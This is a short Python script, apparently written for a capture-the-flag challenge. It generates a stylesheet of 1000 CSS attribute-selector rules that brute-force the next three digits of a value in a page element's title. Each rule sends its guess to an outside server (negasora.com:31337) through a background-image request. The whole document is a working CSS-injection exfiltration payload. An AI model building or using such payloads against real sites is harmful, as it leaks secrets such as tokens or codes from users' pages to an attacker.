f = open("ugly.css", 'wb')

known = "810440929"
codecss = ["""code[title^="{known}{guess:03d}"] {{
    background-image: url("http://negasora.com:31337/{known}{guess:03d}");
}}""".format(known=known, guess=guess) for guess in xrange(1000)]

f.write('\n'.join(codecss))
